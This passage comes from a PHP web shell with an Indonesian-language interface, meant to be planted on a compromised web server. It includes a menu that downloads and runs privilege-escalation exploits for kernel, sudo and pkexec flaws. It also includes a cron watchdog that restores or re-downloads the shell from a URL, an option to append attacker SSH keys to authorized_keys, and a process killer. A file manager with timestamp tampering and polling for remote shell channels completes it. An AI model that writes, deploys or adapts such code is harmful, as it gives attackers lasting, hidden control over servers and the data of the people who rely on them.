    <div class="name">Auto Privilege Escalation (CVE Exploiter)</div>
    <div class="muted" style="margin-bottom:10px;">
        Download PoC dari GitHub.
    </div>
    
    <?php if (!empty($privesc_msg)) { ?>
        <div class="msg"><?php echo $privesc_msg; ?></div>
    <?php } ?>

    <div class="form-grid">
        <div>
            <div class="muted"><b>Linux Privilege Escalation</b></div>
            <form method="post" style="margin-top:8px;">
                <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                <select name="privesc_action" style="width:100%;margin-bottom:6px;background:#0f1117;color:#e6edf3;border:1px solid #30363d;padding:7px;border-radius:6px;">
                    <optgroup label="2026 (Terbaru)">
                        <option value="copyfail">CVE-2026-31431 (Copy Fail) - Kernel 4.9-6.18 [CISA KEV]</option>
                        <option value="dirtyfrag">CVE-2026-43284 (Dirty Frag) - Kernel</option>
                        <option value="fragnesia">CVE-2026-46300 (Fragnesia) - Kernel [PoC Publik]</option>
                        <option value="pack2root">CVE-2026-41651 (Pack2TheRoot) - PackageKit</option>
                        <option value="pedit_cow">CVE-2026-46331 (Pedit COW) - Kernel 5.18+</option>
                    </optgroup>
                    <optgroup label="2025">
                        <option value="sudo_chroot">CVE-2025-32463 (Sudo Chroot) - Sudo</option>
                        <option value="sudo_host">CVE-2025-32462 (Sudo Host) - Sudo</option>
                    </optgroup>
                    <optgroup label="2024 - 2021 (Klasik)">
                        <option value="nftables">CVE-2024-1086 (nf_tables) - Kernel 5.14-6.6 [CISA KEV]</option>
                        <option value="dirtypipe">CVE-2022-0847 (Dirty Pipe) - Kernel 5.8-5.16</option>
                        <option value="pwnkit">CVE-2021-4034 (PwnKit) - pkexec</option>
                        <option value="baron_samedit">CVE-2021-3156 (Baron Samedit) - Sudo</option>
                    </optgroup>
                </select>
                <div style="margin-top:6px;">
                    <input type="submit" class="btn btn-red" value="Run Exploit" onclick="return confirm('Download & jalankan exploit ini?');">
                </div>
            </form>
            <div class="hint" style="margin-top:12px;">
                <b>Catatan:</b> Beberapa CVE mungkin udah di-patch di RHEL 9.5. <br>
                <b>Copy Fail</b> & <b>Fragnesia</b> butuh user namespace. <b>Pack2TheRoot</b> butuh PackageKit. <br>
            </div>
        </div>
    </div>
</div>
<?php endif; ?>
<?php if ($tab_ext === 'process'): ?>
<?php
$out = array();
$f_exec = F('ex');
@$f_exec('ps -eo pid,user,stat,etime,%cpu,%mem,args --sort=-%cpu 2>/dev/null', $out);
$header = isset($out[0]) ? $out[0] : '';
if (isset($out[0])) unset($out[0]);
$current_user = function_exists('get_current_user') ? get_current_user() : 'www-data';
$user_count = array();
foreach ($out as $line) {
    $line = trim($line);
    if (empty($line)) continue;
    $parts = preg_split('/\s+/', $line, 7);
    if (count($parts) >= 7 && isset($parts[1])) {
        $user_count[$parts[1]] = (isset($user_count[$parts[1]]) ? $user_count[$parts[1]] : 0) + 1;
    }
}
?>
<div class="box">
    <div class="name">Process Manager</div>
    <div class="muted" style="margin-bottom:10px;">
        login sebagai <b><?php echo h($current_user); ?></b>.
        Cuma bisa kill proses milik sendiri.
    </div>
    
    <div style="display:flex; gap:15px; flex-wrap:wrap; margin-bottom:10px; font-size:11px;">
        <?php foreach ($user_count as $u => $c) { ?>
            <span style="background:#1b2330; padding:4px 8px; border-radius:4px; border:1px solid #2a3140;">
                <?php echo h($u); ?>: <b style="color:#7ee787;"><?php echo $c; ?></b>
            </span>
        <?php } ?>
    </div>

    <table>
        <tr>
            <th>PID</th>
            <th>User</th>
            <th>STAT</th>
            <th>Time</th>
            <th>CPU%</th>
            <th>MEM%</th>
            <th>Command</th>
            <th>Action</th>
        </tr>
        <?php
        foreach ($out as $line) {
            $line = trim($line);
            if (empty($line)) continue;
            $parts = preg_split('/\s+/', $line, 7);
            if (count($parts) < 7) continue;
            
            list($pid, $user, $stat, $etime, $cpu, $mem, $cmd) = $parts;
            $can_kill = ($user === $current_user || $current_user === 'root');
            $row_style = $can_kill ? '' : 'opacity:0.5;';
            
            echo "<tr style='{$row_style}'>";
            echo "<td>{$pid}</td>";
            echo "<td>" . h($user) . "</td>";
            echo "<td>" . h($stat) . "</td>";
            echo "<td>" . h($etime) . "</td>";
            echo "<td>" . h($cpu) . "</td>";
            echo "<td>" . h($mem) . "</td>";
            echo "<td style='font-family:monospace;font-size:11px;max-width:400px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;' title='" . h($cmd) . "'>" . h($cmd) . "</td>";
            echo "<td>";
            if ((int)$pid > 1) {
                if ($can_kill) {
                    echo "<form method='post' style='display:inline;'>
                            <input type='hidden' name='kill_process' value='{$pid}'>
                            <input type='submit' class='btn btn-red' value='Kill' onclick=\"return confirm('Yakin matiin PID {$pid} ({$user})?');\">
                          </form>";
                } else {
                    echo "<span style='color:#8e99ab;font-size:10px;'>perlu root</span>";
                }
            }
            echo "</td>";
            echo "</tr>";
        }
        ?>
    </table>
</div>
<?php endif; ?>

<?php if ($tab_ext === 'cron'): ?>
<?php
$pst = rct_state_load($rct_state_file);
$p_back = (isset($pst['backups']) && is_array($pst['backups'])) ? $pst['backups'] : array();
$p_live = array();
foreach ($p_back as $pb) { if (@is_file($pb)) $p_live[] = $pb; }
// tab ini nggak ngeksekusi apa pun saat dibuka: semua probe jalan hanya kalau tombol Diagnostik ditekan,
// hasilnya disimpan ke .rct_state.json supaya refresh berikutnya tetap instan
$psc = (isset($pst['scan']) && is_array($pst['scan'])) ? $pst['scan'] : array();
if (isset($_POST['persist_scan'])) {
    $p_t0 = microtime(true);
    try {
        list($p_probe_o, $p_exrc_new) = rct_run('true');
        list($p_crontab_new, $p_via_new) = rct_cron_read();
        $p_daemon_new = rct_cron_daemon();
        $psc = array('t'=>time(),'exrc'=>(int)$p_exrc_new,'via'=>(string)$p_via_new,'crontab'=>(string)$p_crontab_new,'daemon'=>(string)$p_daemon_new,'ms'=>(int)round((microtime(true)-$p_t0)*1000),'err'=>'');
    } catch (Exception $p_e) {
        $psc = array('t'=>time(),'ms'=>(int)round((microtime(true)-$p_t0)*1000),'err'=>$p_e->getMessage());
    }
    $pst['scan'] = $psc;
    rct_state_save($rct_state_file, $pst);
}
$p_scanned = !empty($psc['t']);
$p_exrc = $p_scanned && isset($psc['exrc']) ? (int)$psc['exrc'] : null;
$p_cron_via = $p_scanned && isset($psc['via']) ? (string)$psc['via'] : 'belum dicek';
$p_crontab = $p_scanned && isset($psc['crontab']) ? (string)$psc['crontab'] : '';
$p_daemon = $p_scanned && isset($psc['daemon']) ? (string)$psc['daemon'] : 'belum dicek';
$p_wd = array();
foreach (preg_split("/\r\n|\n|\r/", $p_crontab) as $pl) { if (strpos($pl, 'RCT-WD') !== false && trim($pl) !== '') $p_wd[] = $pl; }
$p_kpath = isset($pst['keypath']) ? $pst['keypath'] : '';
$p_key_ok = $p_kpath !== '' && @is_file($p_kpath) && strpos((string)@file_get_contents($p_kpath), '# RCT-KEY') !== false;
$p_target = isset($pst['target']) && $pst['target'] !== '' ? $pst['target'] : __FILE__;
$p_rc_home = rct_home();
$p_default_key = ($p_rc_home !== '' ? $p_rc_home : dirname(__DIR__)) . '/.ssh/authorized_keys';
$p_user = rct_user_name();
$p_spool = rct_cron_file();
$p_probe_last = ''; $p_probe_age = -1;
if (isset($pst['probe']['file']) && @is_file($pst['probe']['file'])) {
    $p_probe_last = trim((string)@file_get_contents($pst['probe']['file']));
    $p_probe_age = time() - (int)@filemtime($pst['probe']['file']);
}
$p_loop = isset($pst['loop_pid']) ? (int)$pst['loop_pid'] : 0;
$p_loop_live = $p_loop > 1 && pid_alive($p_loop);
?>
<div class="box">
    <div class="name">Persistence &amp; Watchdog</div>
    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-bottom:12px; font-size:11px;">
        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">exec: <b style="color:<?php echo $p_exrc === null ? '#8e99ab' : ($p_exrc === -1 ? '#ff7b72' : '#7ee787'); ?>;"><?php echo $p_exrc === null ? '?' : ($p_exrc === -1 ? 'mati' : 'idup'); ?></b></span>
        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">cron read: <b style="color:<?php echo $p_cron_via === 'belum dicek' ? '#8e99ab' : ($p_cron_via === 'exec mati' ? '#e3b341' : '#7ee787'); ?>;"><?php echo h($p_cron_via); ?></b></span>
        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">daemon cron: <b style="color:<?php echo $p_daemon === 'belum dicek' ? '#8e99ab' : ($p_daemon === 'mati' ? '#ff7b72' : '#7ee787'); ?>;"><?php echo h($p_daemon); ?></b></span>
        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">user: <code><?php echo h($p_user); ?></code></span>
        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">spool: <code><?php echo h($p_spool !== '' ? $p_spool : 'nggak writable'); ?></code></span>
        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">watchdog: <?php if ($p_scanned) { ?><b style="color:<?php echo $p_wd ? '#7ee787' : '#8e99ab'; ?>;"><?php echo count($p_wd); ?></b> baris<?php } else { ?><b style="color:#8e99ab;">—</b><?php } ?></span>
        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">backup: <b style="color:<?php echo $p_live ? '#7ee787' : '#8e99ab'; ?>;"><?php echo count($p_live); ?></b></span>
        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">ssh key: <b style="color:<?php echo $p_key_ok ? '#7ee787' : '#8e99ab'; ?>;"><?php echo $p_key_ok ? 'terpasang' : 'belum'; ?></b></span>
        <?php if ($p_loop) { ?><span style="background:#1b2330; padding:4px 8px; border-radius:4px;">loop guard: <b style="color:<?php echo $p_loop_live ? '#7ee787' : '#ff7b72'; ?>;"><?php echo $p_loop_live ? 'pid ' . $p_loop : 'mati'; ?></b></span><?php } ?>
        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">target: <code><?php echo h($p_target); ?></code></span>
    </div>

    <form method="post" style="margin-bottom:12px; padding:8px 10px; border-radius:6px; background:#11161f; border:1px solid #2a3140; font-size:11px;">
        <input type="submit" name="persist_scan" value="Jalankan diagnostik" class="btn">
        <?php if ($p_scanned) { ?>
        <span class="muted" style="margin-left:8px;">terakhir <?php echo date('d/m H:i:s', (int)$psc['t']); ?> &middot; <?php echo (int)(isset($psc['ms']) ? $psc['ms'] : 0); ?> ms</span>
        <?php } else { ?>
        <span class="muted" style="margin-left:8px;">belum pernah dicek</span>
        <?php } ?>
        <div class="muted" style="margin-top:5px;">Tab ini sengaja nggak ngeksekusi apa pun waktu dibuka. Tekan tombol ini sekali; hasilnya disimpan dan dipakai terus sampai ditekan lagi.</div>
        <?php if (!empty($psc['err'])) { ?>
        <div style="margin-top:6px; color:#ff7b72;">Probe error: <code><?php echo h($psc['err']); ?></code></div>
        <?php } ?>
    </form>

    <?php if ($p_probe_age >= 0) { ?>
    <div style="margin-bottom:12px; padding:8px 10px; border-radius:6px; font-size:11px; background:<?php echo ($p_probe_age < 150) ? '#0f2a17' : '#2a1a0f'; ?>; border:1px solid <?php echo ($p_probe_age < 150) ? '#2ea043' : '#9e6a03'; ?>;">
        <b>Tes cron: <?php echo ($p_probe_age < 150) ? 'CRON JALAN' : 'CRON NGGAK NGEKSEKUSI'; ?></b>
        &middot; umur output <?php echo $p_probe_age; ?>s &middot; isi terakhir: <code><?php echo h(substr($p_probe_last, -120)); ?></code><br>
        <?php echo ($p_probe_age < 150)
            ? 'Daemon cron baca baris user ini. Kalau watchdog tetap nggak balikin file, cek backup masih ada.'
            : 'Barisnya ada di crontab tapi nggak pernah jalan — daemon mati, atau spool ditulis langsung tanpa dibaca cron. Pakai Loop guard.'; ?>
        <form method="post" style="display:inline; margin-left:6px;"><input type="hidden" name="persist_action" value="probe_remove"><input type="submit" class="btn" value="Hapus tes" style="padding:2px 8px;font-size:10px;"></form>
    </div>
    <?php } elseif (isset($pst['probe'])) { ?>
    <div style="margin-bottom:12px; padding:8px 10px; border-radius:6px; font-size:11px; background:#1b2330; border:1px solid #2a3140;">
        Tes cron terpasang, nunggu eksekusi pertama — refresh tab ini setelah 2 menit.
    </div>
    <?php } ?>

    <?php if ($p_wd) { ?>
    <div style="margin-bottom:12px;">
        <b>Cron watchdog aktif:</b>
        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php echo h(implode("\n", $p_wd)); ?></pre>
    </div>
    <?php } ?>

    <form method="post" style="border-top:1px solid #2a3140; padding-top:12px; margin-bottom:12px;">
        <b>Pasang watchdog cron</b>
        <div class="muted" style="margin:4px 0 8px 0;font-size:11px;">Tiap interval, shell ngecek target masih ada. Kalau kehapus → restore dari backup lokal atau download dari URL.</div>
        <div style="display:flex; gap:8px; flex-wrap:wrap; align-items:center;">
            <label style="font-size:11px;">Target <input type="text" name="p_target" value="<?php echo h($p_target); ?>" style="width:260px;font-size:11px;"></label>
            <label style="font-size:11px;">Interval
                <select name="p_interval" style="font-size:11px;">
                    <option value="5">5 menit</option>
                    <option value="10">10 menit</option>
                    <option value="15" selected>15 menit</option>
                    <option value="30">30 menit</option>
                    <option value="60">60 menit</option>
                    <option value="@reboot">@reboot</option>
                </select>
            </label>
            <label style="font-size:11px;">Sumber
                <select name="p_mode" style="font-size:11px;">
                    <option value="backup" selected>backup lokal</option>
                    <option value="both">backup + URL</option>
                    <option value="url">URL saja</option>
                </select>
            </label>
            <input type="text" name="p_url" placeholder="https://host/x.php (opsional)" style="width:240px;font-size:11px;">
            <input type="submit" name="persist_action" value="install_watchdog" class="btn btn-green" onclick="return confirm('Pasang baris cron watchdog?');">
        </div>
    </form>

    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-bottom:14px;">
        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="make_backups"><input type="submit" class="btn" value="Buat backup sekarang"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="restore_now"><input type="submit" class="btn btn-yellow" value="Restore dari backup"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="remove_watchdog"><input type="submit" class="btn" value="Hapus cron watchdog"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="remove_backups"><input type="submit" class="btn btn-red" value="Hapus semua backup" onclick="return confirm('Hapus semua file backup?');"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="remove_all"><input type="submit" class="btn btn-red" value="Remove ALL hook" onclick="return confirm('Hapus cron watchdog + backup + key RCT? Ini beneran bersihin semua.');"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="test_cron"><input type="submit" class="btn btn-green" value="Tes cron (1 menit)"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="loop_guard"><input type="submit" class="btn btn-yellow" value="Loop guard (tanpa cron)" onclick="return confirm('Jalankan loop pengawal di background? Butuh exec.');"></form>
        <?php if ($p_loop) { ?><form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="stop_loop"><input type="submit" class="btn btn-red" value="Stop loop guard"></form><?php } ?>
    </div>

    <?php if ($p_live) { ?>
    <div style="margin-bottom:14px;">
        <b>Backup lokal:</b>
        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php echo h(implode("\n", $p_live)); ?></pre>
    </div>
    <?php } ?>

    <form method="post" style="border-top:1px solid #2a3140; padding-top:12px;">
        <b>SSH key (nggak butuh exec/cron)</b>
        <div class="muted" style="margin:4px 0 8px 0;font-size:11px;">Append ke authorized_keys dengan marker <code># RCT-KEY</code>. Channel ini selamat walau webroot di-restore.</div>
        <input type="text" name="p_key" placeholder="ssh-ed25519 AAAA... olivia@pwn" style="width:100%;font-size:11px;margin-bottom:6px;">
        <div style="display:flex; gap:8px; flex-wrap:wrap; align-items:center;">
            <input type="text" name="p_keypath" value="<?php echo h($p_kpath !== '' ? $p_kpath : $p_default_key); ?>" style="width:320px;font-size:11px;">
            <input type="submit" name="persist_action" value="install_key" class="btn btn-green" formnovalidate>
            <input type="submit" name="persist_action" value="remove_keys" class="btn btn-red">
        </div>
    </form>
</div>

<div class="box">
    <div class="name">Cron &amp; Timer di Host</div>
    <div style="margin-bottom:12px;">
        <b>Crontab user saat ini:</b>
        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php echo h($p_crontab !== '' ? $p_crontab : ($p_scanned ? '(kosong — dibaca via ' . $p_cron_via . ')' : 'belum dicek — tekan Diagnostik di atas')); ?></pre>
    </div>
</div>
<?php endif; ?>
<?php 
$action_page = isset($_GET['action_page']) ? $_GET['action_page'] : '';
$target_file = isset($_GET['target']) ? $_GET['target'] : '';

if ($view != '' && @is_file($view)) { ?>
    
    <!-- HALAMAN VIEW -->
    <div class="box">
        <div class="name">View File: <?php echo h($view); ?></div>
        <div class="muted" style="margin:8px 0 12px 0;">Size: <?php echo h(format_size(@filesize($view))); ?> | Perm: <?php echo h(perms($view)); ?></div>
        <?php if (is_image_file($view)) { ?>
            <div style="margin-top:12px;"><img src="?img=<?php echo urlencode($view); ?>" style="max-width:100%; border-radius:8px;" alt=""></div>
        <?php } else { ?>
            <pre><?php echo h(@file_get_contents($view)); ?></pre>
        <?php } ?>
        <div style="margin-top:12px;">
            <a class="btn" href="?path=<?php echo urlencode(dirname($view)); ?>">Back</a>
            <a class="btn btn-green" href="?edit=<?php echo urlencode($view); ?>">Edit</a>
            <a class="btn btn-yellow" href="?download=<?php echo urlencode($view); ?>">Download</a>
        </div>
    </div>

<?php } elseif ($edit != '' && @is_file($edit)) { ?>
    
    <!-- HALAMAN EDIT -->
    <div class="box">
        <div class="name">Edit File: <?php echo h($edit); ?></div>
        <form method="post">
            <input type="hidden" name="action" value="save_file">
            <input type="hidden" name="path" value="<?php echo h(dirname($edit)); ?>">
            <input type="hidden" name="file" value="<?php echo h($edit); ?>">
            <textarea name="content"><?php echo h(@file_get_contents($edit)); ?></textarea>
            <div style="margin-top:12px;">
                <input type="submit" class="btn btn-green" value="Save File">
                <a class="btn" href="?view=<?php echo urlencode($edit); ?>">View</a>
                <a class="btn" href="?path=<?php echo urlencode(dirname($edit)); ?>">Back</a>
            </div>
        </form>
    </div>

<?php } elseif ($action_page != '' && $target_file != '' && @file_exists($target_file)) { 
    $target_name = basename($target_file);
    $target_perm = perms($target_file);
    $target_mtime = date('Y-m-d H:i:s', @filemtime($target_file));
?>

    <div class="box">
        <div class="name"><?php echo strtoupper($action_page); ?>: <?php echo h($target_name); ?></div>
        <div class="muted" style="margin:8px 0 12px 0;">
            Path: <?php echo h($target_file); ?><br>
            Perm: <?php echo h($target_perm); ?> | Modified: <?php echo h($target_mtime); ?>
        </div>

        <form method="post" style="max-width: 500px;">
            <input type="hidden" name="action" value="<?php echo h($action_page); ?>">
            <input type="hidden" name="path" value="<?php echo h(dirname($target_file)); ?>">
            <input type="hidden" name="target" value="<?php echo h($target_file); ?>">

            <?php if ($action_page === 'rename'): ?>
                <div style="margin-bottom:8px;">
                    <div class="muted" style="margin-bottom:4px;">Nama Baru:</div>
                    <input type="text" name="new" value="<?php echo h($target_name); ?>" required>
                </div>
                <input type="hidden" name="old" value="<?php echo h($target_file); ?>">
                <input type="submit" class="btn btn-green" value="Simpan Nama">

            <?php elseif ($action_page === 'chmod'): ?>
                <div style="margin-bottom:8px;">
                    <div class="muted" style="margin-bottom:4px;">Mode (Octal):</div>
                    <input type="text" name="mode" value="<?php echo h($target_perm); ?>" placeholder="(mis: 0644)" required>
                </div>
                <input type="submit" class="btn btn-green" value="Simpan Chmod">

            <?php elseif ($action_page === 'touch'): ?>
                <div style="margin-bottom:8px;">
                    <div class="muted" style="margin-bottom:4px;">Waktu (Format: YYYY-MM-DD HH:MM:SS):</div>
                    <input type="text" name="touch_time" value="<?php echo h($target_mtime); ?>" placeholder="(mis: 2024-05-20 14:30:00)" required>
                </div>
                <input type="submit" class="btn btn-green" value="Simpan Timestamp">
            <?php endif; ?>

            <a class="btn" href="?path=<?php echo urlencode(dirname($target_file)); ?>">Batal / Back</a>
        </form>
    </div>

<?php } else { ?>
    <div class="box">
        <table class="grid">
            <tr>
                <td>
                    <div class="name">New File</div>
                    <form method="post" style="margin-top:10px;">
                        <input type="hidden" name="action" value="new_file">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="text" name="name">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Create"></div>
                    </form>
                </td>
                 <td>
                    <div class="name">New Folder</div>
                    <form method="post" style="margin-top:10px;">
                        <input type="hidden" name="action" value="new_folder">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="text" name="name">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Create"></div>
                    </form>
                 </td>
                 <td>
                    <div class="name">Upload File</div>
                    <form method="post" enctype="multipart/form-data" style="margin-top:10px;">
                        <input type="hidden" name="action" value="upload">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="file" name="upfile">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Upload"></div>
                    </form>
                 </td>
             </tr>
         </table>
    </div>

    <div class="box">
        <div class="name">Directory List</div>
        <div style="margin-top:10px;">
            <form method="post" id="batchForm" autocomplete="off">
                <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                <div id="batchActionBar" style="display:none; margin-bottom:10px; gap:8px; align-items:center; flex-wrap:wrap; background:#1b2330; padding:10px; border-radius:8px; border:1px solid #3a4f6e;">
                    <span style="font-weight:bold; color:#fff;">Batch Action:</span>
                    <input type="text" name="batch_mode" placeholder="(mis: 0755)" style="width:100px;">
                    <button type="submit" name="batch_action" value="delete" class="btn btn-red" onclick="return confirm('Hapus semua file terpilih?');">Delete Selected</button>
                    <button type="submit" name="batch_action" value="chmod" class="btn btn-yellow">Chmod Selected</button>
                    <button type="submit" name="batch_action" value="zip" class="btn btn-blue">Download ZIP</button>
                </div>
                <div style="overflow-x: auto; margin-top:10px;">
                <table class="fm-table">
                    <tr>
                        <th class="col-check"><input type="checkbox" id="selectAll" onclick="toggleAll(this)"></th>
                        <th class="col-name">Name</th>
                        <th class="col-small">Type</th>
                        <th class="col-small">Size</th>
                        <th class="col-med">Modified</th>
                        <th class="col-small">Perm</th>
                        <th class="col-small">Owner</th>
                        <th class="col-small">Group</th>
                        <th class="col-actions">Quick Actions</th>
                    </tr>
                    <?php
                    $CAP = 2000;
                    $items = array();
                    $more  = 0;
                    $dh = @opendir($cwd_real);
                    if ($dh !== false) {
                        while (($f = @readdir($dh)) !== false) {
                            if ($f === '.' || $f === '..') continue;
                            if (count($items) < $CAP) { $items[] = $f; } else { $more++; }
                        }
                        @closedir($dh);
                    }
                    $n = 0;
                    if (count($items) > 0) {
                        $dirs = array(); $files = array();
                        foreach ($items as $item) {
                            $full = $cwd_real . '/' . $item;
                            if (@is_dir($full)) { $dirs[] = $item; } else { $files[] = $item; }
                        }
                        sort($dirs, SORT_NATURAL | SORT_FLAG_CASE); sort($files, SORT_NATURAL | SORT_FLAG_CASE);
                        $sorted = array_merge($dirs, $files);
                        foreach ($sorted as $item) {
                            $full = $cwd_real . '/' . $item;
                            $is_dir = @is_dir($full);
                            $mtime = @filemtime($full);
                            $modified = $mtime ? gmdate('Y-m-d H:i:s', $mtime) : '-';
                            $perm_text = perms_string($full);
                            $perm_class = @is_writable($full) ? 'perm-green' : 'perm-white';
                            $item_size = $is_dir ? '-' : format_size(@filesize($full));
                            $item_perm = perms($full);
                            $item_owner = fowner_name($full);
                            $item_group = fgroup_name($full);
                            $n++;
                    ?>
                    <tr>
                        <td style="text-align:center;"><input type="checkbox" name="batch_files[]" value="<?php echo h($item); ?>" class="chkbox" onchange="toggleActionBar()"></td>
                        <td>
                            <?php if ($is_dir) { ?>
                                <span class="dir">[DIR]</span>
                                <a class="dir" href="?path=<?php echo urlencode($full); ?>"><?php echo h($item); ?></a>
                            <?php } else { ?>
                                <span class="file">[FILE]</span>
                                <span class="hoverbox">
                                    <span class="name"><?php echo h($item); ?></span>
                                    <span class="previewbox">
                                        <?php if (is_image_file($full)) { ?>
                                            <img src="?img=<?php echo urlencode($full); ?>" alt="">
                                        <?php } ?>
                                        <div class="miniinfo">
                                            <div class="row"><b>Name:</b> <?php echo h($item); ?></div>
                                            <div class="row"><b>Ext:</b> <?php echo h(file_ext($full)); ?></div>
                                            <div class="row"><b>Size:</b> <?php echo h($item_size); ?></div>
                                            <div class="row"><b>Modified:</b> <?php echo h($modified); ?></div>
                                            <div class="row"><b>Perm:</b> <?php echo h($item_perm); ?></div>
                                            <div class="row"><b>Owner:</b> <?php echo h($item_owner); ?></div>
                                            <div class="row"><b>Group:</b> <?php echo h($item_group); ?></div>
                                            <div class="row"><b>Path:</b> <?php echo h($full); ?></div>
                                        </div>
                                    </span>
                                </span>
                            <?php } ?>
                        </td>
                        <td><?php echo $is_dir ? 'DIR' : 'FILE'; ?></td>
                        <td><?php echo $is_dir ? '-' : h(format_size(@filesize($full))); ?></td>
                        <td><?php echo h($modified); ?></td>
                        <td><span class="<?php echo $perm_class; ?>"><?php echo h($perm_text); ?></span></td>
                        <td style="font-size:11px;"><?php echo h($item_owner); ?></td>
                        <td style="font-size:11px;"><?php echo h($item_group); ?></td>
                        <td class="quick">
                            <?php if (!$is_dir) { ?>
                                <a class="btn" href="?view=<?php echo urlencode($full); ?>">View</a>
                                <a class="btn btn-green" href="?edit=<?php echo urlencode($full); ?>">Edit</a>
                                <a class="btn btn-yellow" href="?download=<?php echo urlencode($full); ?>">Download</a>
                            <?php } else { ?>
                                                                <a class="btn" href="?path=<?php echo urlencode($full); ?>">Open</a>
                                <button type="button" class="btn btn-blue" onclick="confirmZipFolder('<?php echo h(addslashes($cwd_real)); ?>', '<?php echo h(addslashes($full)); ?>')" style="padding:2px 6px;font-size:10px;">ZIP</button>
                            <?php } ?>
                            <a class="btn" href="?action_page=rename&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Rename</a>
                            <a class="btn" href="?action_page=chmod&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Chmod</a>
                            <a class="btn" href="?action_page=touch&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Touch</a>
                            <button type="button" class="btn btn-red"
    onclick="if(confirm('Yakin hapus <?php echo h(addslashes($item)); ?>?')){location.href='?path=<?php echo urlencode($cwd_real); ?>&delete_path=<?php echo urlencode($full); ?>';}"
    style="padding:2px 6px;font-size:10px;">Delete</button>
                        </td>
                    </tr>
                    <?php
                        }
                    }
                    if ($n == 0) { echo '<tr><td colspan="9">Folder kosong</td></tr>'; }
                    if ($more > 0) { echo '<tr><td colspan="9" style="background:#3a341f;color:#ffd28a;font-weight:bold;">Nampilin ' . $n . ' dari total ' . ($n + $more) . ' entri.</td></tr>'; }
                    ?>
                </table>
                </div>
            </form>
            <form method="post" id="zipFolderForm" style="display:none;">
                <input type="hidden" name="action" value="zip_folder">
                <input type="hidden" name="path" id="zipPath" value="">
                <input type="hidden" name="target" id="zipTarget" value="">
            </form>
            <form method="post" id="delForm" style="display:none;">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="path" id="delPath" value="">
                <input type="hidden" name="target" id="delTarget" value="">
            </form>
        </div>
    </div>
<?php } ?>
</div>
<script>
function setCmd(cmd) { document.getElementById('cmd').value = cmd; }
function rctCopy(id) {
    var e = document.getElementById(id);
    if (!e) return;
    e.select(); e.setSelectionRange(0, 99999);
    try { document.execCommand('copy'); } catch (x) {}
}
function rctPoll() {
    var out = document.getElementById('rct-out');
    var st  = document.getElementById('rct-status');
    if (!out) return;
    var x = new XMLHttpRequest();
    x.open('GET', '?shell_poll=1&_=' + (+new Date()), true);
    x.onreadystatechange = function() {
        if (x.readyState === 4) {
            if (x.status === 200) { out.textContent = x.responseText; st.textContent = x.responseText.indexOf('[alive] yes') > -1 ? 'running' : 'stopped'; }
            else { out.textContent = 'poll error: HTTP ' + x.status; }
        }
    };
    x.send(null);
}
function gsPoll() {
    var out = document.getElementById('gs-out');
    var st  = document.getElementById('gs-status');
    var cmd = document.getElementById('gs-cmd');
    if (!out) return;
    var x = new XMLHttpRequest();
    x.open('GET', '?gs_poll=1&_=' + (+new Date()), true);
    x.onreadystatechange = function() {
        if (x.readyState === 4) {
            if (x.status === 200) {
                var t = x.responseText; out.textContent = t;
                var a = t.indexOf('[alive] yes') > -1; var b = t.indexOf('[binary] present') > -1;
                st.textContent = !b ? 'no binary' : (a ? 'running' : 'stopped');
                var m = t.match(/\[command\]\s*(.+)/); if (m && cmd) cmd.value = m[1].trim();
            } else { out.textContent = 'poll error: HTTP ' + x.status; }
        }
    };
    x.send(null);
}
function copyGsCmd() {
    var e = document.getElementById('gs-cmd');
    if (!e || !e.value) return;
    e.select(); e.setSelectionRange(0, 99999);
    try { document.execCommand('copy'); } catch (x) {}
    if (navigator.clipboard) navigator.clipboard.writeText(e.value).catch(function(){});
}
function fmtSize(s) {
    if (!s || isNaN(s)) return '-';
    if (s >= 1073741824) return (s/1073741824).toFixed(2) + ' GB';
    if (s >= 1048576)    return (s/1048576).toFixed(2) + ' MB';
    if (s >= 1024)       return (s/1024).toFixed(2) + ' KB';
    return s + ' B';
}
function statPoll() {
    var x = new XMLHttpRequest();
    x.open('GET', '?stats=1&_=' + (+new Date()), true);
    x.onreadystatechange = function() {
        if (x.readyState !== 4 || x.status !== 200) return;
        var d; try { d = JSON.parse(x.responseText); } catch(e) { return; }
        var up = document.getElementById('stat-uptime'); if (up) up.textContent = d.uptime_h;
        var ram = document.getElementById('stat-ram'); if (ram) ram.textContent = fmtSize(d.mem_avail * 1024);
        var ramt = document.getElementById('stat-ram-total'); if (ramt) ramt.textContent = fmtSize(d.mem_total * 1024);
